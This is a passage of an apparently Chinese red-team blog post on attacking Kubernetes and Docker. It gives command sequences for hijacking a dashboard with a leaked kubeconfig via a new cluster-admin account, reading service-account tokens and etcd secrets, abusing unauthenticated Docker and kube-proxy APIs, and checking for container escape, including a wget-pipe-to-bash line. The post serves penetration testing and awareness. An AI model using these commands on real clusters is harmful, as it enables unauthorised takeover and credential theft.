+<p>######## Dashboard Config登录</p>
+<p><strong>利用场景</strong></p>
+<ul>
+<li>项目托管不当导致kubernet config文件泄露，例如：Github、Gitlab等，之后接管Kubernet dashboard</li>
+<li>在获取到Node节点权限的情况下通过kubeconfig来接管Kubernet dashboard</li>
+</ul>
+<p><strong>基础知识</strong></p>
+<p>用户凭证保存在kubeconfig文件中，kubectl通过以下顺序来找到kubeconfig文件</p>
+<ul>
+<li>如果提供了&ndash;kubeconfig参数，就使用提供的kubeconfig文件</li>
+<li>如果未提供&ndash;kubeconfig参数，但设置了环境变量$KUBECONFIG，则使用该环境变量提供的kubeconfig文件</li>
+<li>如果以上两种情况都没有，那么kubectl就使用默认的kubeconfig文件$HOME/.kube/config</li>
+</ul>
+<p><strong>利用流程</strong></p>
+<p>Step 1：获取namespace</p>
+<pre tabindex="0"><code>kubectl get namespace</code></pre><p>Step 2：创建dashboard管理用户</p>
+<pre tabindex="0"><code>kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard</code></pre><p>Step 3：绑定用户为集群管理用户</p>
+<pre tabindex="0"><code>kubectl create clusterrolebinding dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin</code></pre><p>Step 4：获取token(后续可以使用token登录)</p>
+<pre tabindex="0"><code>kubectl get sa,secrets -n kubernetes-dashboard
+
+kubectl describe secret -n kubernetes-dashboard dashboard-admin-token-kqsll</code></pre><p>Step 5：生成kubeconfig文件</p>
+<pre tabindex="0"><code>DASH_TOCKEN=$(kubectl get secret -n kubernetes-dashboard dashboard-admin-token-kqsll -o jsonpath={.data.token}|base64 -d)</code></pre><pre tabindex="0"><code>kubectl config set-cluster kubernetes --server=192.168.17.144:30001 --kubeconfig=/home/r00t/dashbord-admin.conf
+kubectl config set-credentials dashboard-admin --token=$DASH_TOCKEN --kubeconfig=/home/r00t/dashbord-admin.conf
+kubectl config set-context dashboard-admin@kubernetes --cluster=kubernetes --user=dashboard-admin --kubeconfig=/home/r00t/dashbord-admin.conf
+kubectl config use-context dashboard-admin@kubernetes --kubeconfig=/home/r00t/dashbord-admin.conf</code></pre><p>Step 6：赋予读写执行权限</p>
+<pre tabindex="0"><code>chmod 777 dashboard-admin.conf</code></pre><p>Step 7：使用生成的dashbord-admin.conf登录dashboard</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302157630.webp" alt="image-20240530215713435" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302157630.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302157630.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302157630.webp?size=large 2x" data-title="image-20240530215713435" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### docker - 未授权访问</p>
+<p>攻击者可利用对外暴露的docker remote api，执行docker命令</p>
+<p><strong>修复建议：</strong>⽣成证书进⾏api校验：<code>docker -d --tlsverify --tlscacert=ca.pem--tlscert=server-cert.pem--tlskey=server-key.pem-H=tcp://x.x.x.x:2375-H unix:///var/run/dock</code></p>
+<p><code>curl http://ip:2376/version    #可获取docker版本等信息</code></p>
+<p>通过调用docker未授权接口，创建特权容器，挂载宿主机根目录；后续可通过写入ssh公钥和crontab等，完成逃逸和持久化</p>
+<p>####### kube proxy 配置错误</p>
+<p>攻击者可通过kube-proxy代理来未授权访问本地kube-apiserver组件，创建恶意pod或控制已有pod，后续可尝试逃逸⾄宿主机</p>
+<p><strong>修复建议</strong>：kube-proxy禁⽌对外直接使⽤&ndash;address=0.0.0.0参数</p>
+<p>该漏洞⼀般为业务或开发为了⽅便，通过kubectl proxy &ndash;address=0.0.0.0命令，将kube-apiserver暴露到0.0.0.0，且默认未授权之后请求8001端⼝即可未授权访问kube-apiserver；后续可按照kube-apiserver未授权进行处理。</p>
+<h6 id="容器内利用" class="heading-element"><span>0.0.0.1.2  容器内利用</span>
+  <a href="#%e5%ae%b9%e5%99%a8%e5%86%85%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 判断是否为容器环境</p>
+<p>首先对于 RT 而言，需要先判断当前环境是不是容器环境，可以直接使用下面的命令去判断</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/1/cgroup | grep -qi docker <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Is Docker&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Not Docker&#34;</span></span></span></code></pre></div><p>如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。</p>
+<p>####### 信息搜集</p>
+<pre tabindex="0"><code>env
+env | grep KUBERNETES
+
+容器检测
+注意下面的.dockerenv哦：
+cd / | ls -al
+
+内核版本
+需要下载kubectl到pod中，之后通过执行以下命令来获取node节点的内核版本信息
+kubectl get nodes -o jsonpath=&#39;{range .items[*]}{.metadata.name}{&#34;\t&#34;}{.status.nodeInfo.kernelVersion}{&#34;\n&#34;}{end}&#39;</code></pre><p>####### token</p>
+<p>获取token</p>
+<pre tabindex="0"><code>etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true &#34;/&#34; | grep /secrets/kube-system/clusterrole
+cat /var/run/secrets/kuberenetes.io/serviceaccount/token</code></pre><p>利用token访问api server</p>
+<pre tabindex="0"><code>kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token=&#34;&#34; -n kube-system get pods</code></pre><p>####### Secret</p>
+<p>K8s Secrets用于存储敏感数据，从Secrets中获取的AK及通信凭证可用户后续渗透中从外部或云产品API窃取信息：</p>
+<pre tabindex="0"><code>#####命令格式
+./cdk run k8s-secret-dump (auto|&lt;service-account-token-path&gt;)
+
+#####使用实例
+./cdk run k8s-secret-dump auto</code></pre><p>####### 安全策略</p>
+<p>对于已经获取了kubeconfig或sa账号权限，进而想要创建特殊配置的容器，但是受到了K8s Pod Security Policies的限制时可以使用这个Exploit获取Pod Security Policies的规则信息</p>
+<pre tabindex="0"><code>#####命令格式
+./cdk run k8s-psp-dump (auto|&lt;service-account-token-path&gt;
+
+#####使用实例
+./cdk run k8s-psp-dump auto
+2021/03/24 22:15:58 getting K8s api-server API addr.
+    Find K8s api-server in ENV: https://ip:8443
+2021/03/24 22:15:58 trying to dump K8s Pod Security Policies with local service-account: token
+2021/03/24 22:15:58 requesting  /apis/policy/v1beta1/podsecuritypolicies
+2021/03/24 22:15:58 dump Pod Security Policies success, saved in:  k8s_pod_security_policies.json
+2021/03/24 22:15:58 requesting  /api/v1/namespaces/default/pods
+2021/03/24 22:15:58 K8S Pod Security Policies rule list:
+2021/03/24 22:15:58 rule { securityContext.hostPID: true } is not allowed.
+2021/03/24 22:15:58 rule { securityContext.hostIPC: true } is not allowed.
+2021/03/24 22:15:58 rule { volumes[0].hostPath.pathPrefix: \&#34;/proc\&#34; } is not allowed.
+2021/03/24 22:15:58 rule { volumes[1].hostPath.pathPrefix: \&#34;/dev\&#34; } is not allowed.
+2021/03/24 22:15:58 rule { volumes[2].hostPath.pathPrefix: \&#34;/sys\&#34; } is not allowed.
+2021/03/24 22:15:58 rule { volumes[3].hostPath.pathPrefix: \&#34;/\&#34; } is not allowed.
+2021/03/24 22:15:58 rule { containers[0].securityContext.capabilities.add: \&#34;SYS_ADMIN\&#34; } is not allowed.
+2021/03/24 22:15:58 rule { containers[0].securityContext.capabilities.add: \&#34;SYS_PTRACE\&#34; } is not allowed.</code></pre><p>#######  容器逃逸</p>
+<p>在开始之前对于容器逃逸主要有以下三种方法：</p>
+<ol>
+<li>不安全的配置</li>
+<li>相关程序漏洞</li>
+<li>内核漏洞</li>
+</ol>
+<p>######## 0x01 不安全的配置</p>
+<p>######### 1、特权模式</p>
+<p>执行以下命令，如果返回 Is privileged mode 则说明当前是特权模式</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/self/status | grep -qi <span style="color:#a6be9d">&#34;0000003fffffffff&#34;</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Is privileged mode&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Not privileged mode&#34;</span></span></span></code></pre></div><p>如果返回 Not privileged mode 则说明当前不是特权模式</p>
+<p>######### 2、挂载 Docker Socket</p>
+<p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /var/run/ | grep -qi docker.sock <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Socket is mounted.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Socket is not mounted.&#34;</span></span></span></code></pre></div><p>如果返回 Docker Socket is not mounted. 则说明没有挂载</p>
+<p>######### 3、挂载 procfs</p>
+<p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q <span style="color:#a6be9d">2</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Procfs is mounted.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Procfs is not mounted.&#34;</span></span></span></code></pre></div><p>如果返回 Procfs is not mounted. 则说明没有挂载</p>
+<p>######### 4、挂载宿主机根目录</p>
+<p>执行以下命令，如果返回 Root directory is mounted. 则说明宿主机目录被挂载</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name passwd 2&gt;/dev/null | grep /etc/passwd | wc -l | grep -q <span style="color:#a6be9d">7</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Root directory is mounted.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Root directory is not mounted.&#34;</span></span></span></code></pre></div><p>如果返回 Root directory is not mounted. 则说明没有挂载</p>
+<p>######### 5、Docker remote api 未授权访问</p>
+<p>执行以下命令，如果返回 Docker Remote API Is Enabled. 说明目标存在 Docker remote api 未授权访问</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#58a1dd">IP</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">`</span>hostname -i | awk -F. <span style="color:#a6be9d">&#39;{print $1 &#34;.&#34; $2 &#34;.&#34; $3 &#34;.1&#34;}&#39;</span> <span style="color:#a6be9d">`</span> <span style="color:#ff636f">&amp;&amp;</span> timeout <span style="color:#a6be9d">3</span> bash -c <span style="color:#a6be9d">&#34;echo &gt;/dev/tcp/</span><span style="color:#58a1dd">$IP</span><span style="color:#a6be9d">/2375&#34;</span> &gt; /dev/null 2&gt;&amp;<span style="color:#a6be9d">1</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Remote API Is Enabled.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Remote API is Closed.&#34;</span></span></span></code></pre></div><p>如果返回 Docker Remote API is Closed. 则表示目标不存在 Docker remote api 未授权访问</p>
+<p>######## 0x02 内核漏洞</p>
+<p>######### 1、CVE-2016-5195 DirtyCow 逃逸</p>
+<p>执行 uname -r 命令，如果在 2.6.22 &lt;= 版本 &lt;= 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。</p>
+<p>######### 2、CVE-2020-14386</p>
+<p>执行 uname -r 命令，如果在 4.6 &lt;= 版本 &lt; 5.9 之间说明可能存在 CVE-2020-14386 漏洞。</p>
+<p>######### 3、CVE-2022-0847 DirtyPipe 逃逸</p>
+<p>执行 uname -r 命令，如果在 5.8 &lt;= 版本 &lt; 5.10.102 &lt; 版本 &lt; 5.15.25 &lt; 版本 &lt; 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞。</p>
+<p>######## 0x03 容器逃逸检测脚本</p>
+<p>项目地址：https://github.com/teamssix/container-escape-check</p>
+<p>直接在容器中执行以下命令即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/teamssix/container-escape-check/main/container-escape-check.sh -O -| bash</span></span></code></pre></div><p>不过大多容器可能没有 wget 命令，因此可以将脚本先克隆到本地，然后上传到容器再执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/teamssix/container-escape-check.git
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cd</span> container-escape-check
+</span></span><span style="display:flex;"><span>chmod +x container-escape-check.sh
+</span></span><span style="display:flex;"><span>./container-escape-check.sh</span></span></code></pre></div><h5 id="工具" class="heading-element"><span>0.0.0.2  工具</span>
+  <a href="#%e5%b7%a5%e5%85%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="kubectl" class="heading-element"><span>0.0.0.2.1  kubectl</span>
+  <a href="#kubectl" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://cloud.tencent.com/developer/article/1638810"target="_blank" rel="external nofollow noopener noreferrer">https://cloud.tencent.com/developer/article/1638810</a></p>
+<pre tabindex="0"><code>读取pods列表 kubectl -s &#34;http://ip:port&#34; get pods
+dump集群全部信息 kubectl -s &#34;http://ip.port&#34; cluster-info dump</code></pre><h6 id="etcdctl" class="heading-element"><span>0.0.0.2.2  etcdctl</span>
+  <a href="#etcdctl" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>读取键名 etcdctl --endpoints=ip:port get / --prefix --keys-only --limit 50
+保存快照 etcdctl --endpoints=ip:port snapshot save snapshot.db  </code></pre><h6 id="常见指令总结" class="heading-element"><span>0.0.0.2.3  常见指令总结</span>
+  <a href="#%e5%b8%b8%e8%a7%81%e6%8c%87%e4%bb%a4%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code class="language-livecodeserver" data-lang="livecodeserver">kubectl get pods   #查询Pod
+kubectl get pods -n namespace   #查询指定命名空间的Pod
+kubectl get pods --all-namespaces   #查询所有命名空间的Pod
+kubectl describe pod pod-name   #查询Pod的详细信息
+kubectl get serviceaccount   #查询服务账户详情
+kubectl create serviceaccount account-name   #创建服务账户
+kubectl config view 打印出kubeconfig   #配置内容
+kubectl get rolebinding -n namespace   #查看rbac权限设置
+kubectl describe role role-name -n namespace   #查看角色所绑定的规则
+kubectl exec -it pod-name -c container-name main-app -- /bin/bash   #进入指定Pod的容器内部
+kubectl cp pod-name:container-path local-path   #从容器内复制文件到本地
+kubectl get deployment   #查询Deployment的信息
+kubectl scale deployment deployment-name --replicas=3   #扩容/缩容Deployment的Pod数量
+kubectl rollout restart deployment deployment-name   #重启Deployment管理的所有Pod
+kubectl apply -f file.yaml   #应用YAML配置文件</code></pre><p>查看 进入容器</p>
+<pre tabindex="0"><code>kubectl get namespace//获得所有命名空间
+kubectl get pod --all-namespaces -o wide//获得命名空间下的所有容器
+ 
+通过kubectl get pods查询，然后通过下面命令进入
+kubectl exec -it nas-all-0 /bin/bash
+ 
+//进入命名空间下的容器，application是命名空间，psqls-0是容器
+kubectl exec -it -n application psqls-0 /bin/bash
+ 
+//拷贝内容内文件，拷贝出来
+kubectl cp -n application psqls-0:/var/lib/postgresql/data/pg_wal /home
+//拷贝进去
+kubectl cp /home/dades/pg_wal -n application psqls-0:/var/lib/postgresql/data/pg_wal</code></pre><p>文件传输</p>
+<p><a href="https://nj.transwarp.cn:8180/?p=493"target="_blank" rel="external nofollow noopener noreferrer">https://nj.transwarp.cn:8180/?p=493</a></p>
+<pre tabindex="0"><code>1. kubectl cp
+ 使用前提：Pod 中对应的 container 中安装了 tar 命令，该方式不用进入到 Pod 内
+ 注意：有的TOS 里该命令貌似是不能用的
+首先列出 Pod，获取 Pod 的 Name, mycentos 为 pod name 中的关键字
+##### kubectl get pods -o wide | grep -i mycentos
+NAME                        READY   STATUS    RESTARTS   AGE
+mycentos-7b59b5b755-8rbgc   1/1     Running   0          5h20m
+mycentos-7b59b5b755-vm6ld   1/1     Running   1          5h31m
+宿主机 –&gt; Pod
+  将宿主机 /tmp/test_pod.txt 拷贝到 mycentos-7b59b5b755-8rbgc 对应的第一个容器中的 /root 目录下，拷贝目录也是一样的。default 为 namespace
+##### kubectl cp /tmp/test_pod.txt -n namespace mycentos-7b59b5b755-8rbgc:/tmp -c nginx
+
+Pod –&gt; 宿主机
+  将 mycentos-7b59b5b755-8rbgc 中 /root/from_pod.txt 文件拷贝到宿主机 /tmp 目录下，并命名为 from_pod.new
+##### kubectl cp default/mycentos-7b59b5b755-8rbgc:/root/from_pod.txt  /tmp/from_pod.new
+  将 mycentos-7b59b5b755-8rbgc 中 /root/pod_dir 目录下的文件拷贝到宿主机 /tmp 目录下
+##### kubectl cp default/mycentos-7b59b5b755-8rbgc:/root/pod_dir /tmp
+ Tips：
+  Pod –&gt; 宿主机时，拷贝文件需要指定目标文件名；拷贝目录可以不指定
+
+
+2. scp
+ 使用前提：宿主机和 Pod 的 container 中都安装了 scp 命令，需要宿主机的密码，该方式需要进入到 Pod 内
+ 执行如下命令进入 pod，mycentos-7b59b5b755-8rbgc 替换为相应 pod name。
+##### kubectl exec -it  mycentos-7b59b5b755-8rbgc /bin/bash
+宿主机 –&gt; Pod
+  将宿主机 /tmp/test_pod.txt 拷贝到 mycentos-7b59b5b755-8rbgc 对应的第一个容器中 /root 目录下,宿主机 ip 为 172.22.202.69，用户 root
+##### scp -rv root@172.22.202.69:/tmp/test_pod.txt /root 
+Pod –&gt; 宿主机
+  将 mycentos-7b59b5b755-8rbgc 中 /root/from_pod.txt 文件拷贝到宿主机 /tmp 目录下，宿主机 ip 为 172.22.202.69，用户 root
+##### scp -rv /root/from_pod.txt root@172.22.202.69:/tmp
+ Tips: 安装 scp 命令 yum install -y openssh-clients
+
+
+3. docker cp
+  获取 pod 名为 mycentos-7b59b5b755-8rbgc 对应 container 的 id
+##### kubectl describe pod/mycentos-7b59b5b755-8rbgc | grep -iE &#34;\s.*container id.*|Node:\s*.*&#34; -B 2 -A 2
+Namespace:      default
+Priority:       0
+Node:           172.22.202.70/172.22.202.70
+Start Time:     Wed, 07 Aug 2019 12:58:17 +0800
+Labels:         pod-template-hash=7b59b5b755
+--
+Containers:
+  mycentos:
+    Container ID:  docker://5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb
+    Image:         centos
+    Image ID:      docker-pullable://centos@sha256:a799dd8a2ded4a83484bbae769d97655392b3f86533ceb7dd96bbac929809f3c
+  从上面的结果可以得知该 pod 对应的 container 运行在 172.22.202.70 节点上，相应的 container id 为：5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb
+宿主机 –&gt; Pod
+  到 container 运行的 node 172.22.202.70 上，将 /tmp/test_pod.txt 拷贝到容器里 /root 目录下
+##### docker cp /tmp/test_pod.txt 5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb:/root
+Pod –&gt; 宿主机
+  到 container 运行的 node 172.22.202.70 上，将容器内 /root/from_pod.txt 拷贝到本地 /tmp 目录下
+##### docker cp 5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb:/root/from_pod.txt /tmp
+
+
+4. lftp
+ 使用前提：Pod 内容器安装了 lftp 工具，本地宿主机安装并启动了 vsftpd，该方式需要进入到 Pod 内
+ 执行如下命令进入 pod，mycentos-7b59b5b755-8rbgc 替换为相应 pod name。
+##### kubectl exec -it  mycentos-7b59b5b755-8rbgc /bin/bash
+ lftp 连接到 172.22.202.69 的 21 端口，用 root 用户，输入密码后即可进行文件传输
+##### lftp 172.22.202.69 -p 21 -u root
+宿主机 –&gt; Pod
+ lftp 内命令传输示例，将本地 /tmp/pod_dir 目录下的所有文件传输到 Pod 的 /root 目录下
+##### mget /tmp/pod_dir/* -O /root 
+Pod –&gt; 宿主机
+ 将 Pod 的 /root 目录下的 from_pod.txt 文件传输到本地 /tmp 目录下
+##### mput /root/from_pod.txt -O /tmp 
+ Tips:
+  vsftpd 的安装： yum install -y vsftpd &amp;&amp; sleep 2 &amp;&amp; systemctl start vsftpd &amp;&amp; sleep 2 &amp;&amp; systemctl enable vsftpd &amp;&amp; systemctl status vsftpd
+  lftp 的安装： yum install -y lftp
+
+
+5. cp
+ 参考第 3. 部分先获取 Pod 对应的 container id，以下以容器 5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb 举例。
+ 找到 5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb 容器在本地的读写层目录
+##### docker inspect -f &#39;{{.GraphDriver.Data.UpperDir}}&#39; 5c73edb95237ab7e4af2d85aad9674899492134e8addc20dfc05e2a598acd7eb
+ 上述执行结果为：/var/lib/docker/overlay2/e57f783cce10c2d14ea48b6194f3796f361fa9e045e633038b604c32ad9fce1a/diff
+##### ls -lrt /var/lib/docker/overlay2/e57f783cce10c2d14ea48b6194f3796f361fa9e045e633038b604c32ad9fce1a/diff
+total 8
+drwxr-xr-x 8 root root   75 Mar  6 01:34 usr
+drwxr-xr-x 6 root root   48 Mar  6 01:34 var
+drwxr-xr-x 2 root root   28 Aug  7 20:43 dev
+drwxr-xr-x 4 root root 4096 Aug  7 21:05 etc
+drwxrwxrwt 2 root root    6 Aug  7 21:05 tmp
+drwxr-xr-x 3 root root   20 Aug  7 21:05 run
+dr-xr-x--- 5 root root 4096 Aug  7 22:40 root
+宿主机 –&gt; Pod
+  直接在本地操作，将 /tmp/test_pod.txt 文件拷贝到 Pod 的 /root 目录，然后在 Pod 的 /root 目录下便可看到该文件
+##### cp /tmp/test_pod.txt /var/lib/docker/overlay2/e57f783cce10c2d14ea48b6194f3796f361fa9e045e633038b604c32ad9fce1a/diff/root/
+
+
+ 总结：其实 Pod 也可以当作是另一个服务器，所以 Linux 中服务器间传递文件的一些工具如 ftp 等，理论上来说都可以用来实现本地主机和 Pod 内部文件传输。</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - 云安全">云安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/linux/51/" class="post-nav-item" rel="prev" title="Linux 内网传输"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Linux 内网传输</a>
+      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AF%AD%E8%A8%80/java/servlet/92/" class="post-nav-item" rel="next" title="Java注解">Java注解<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
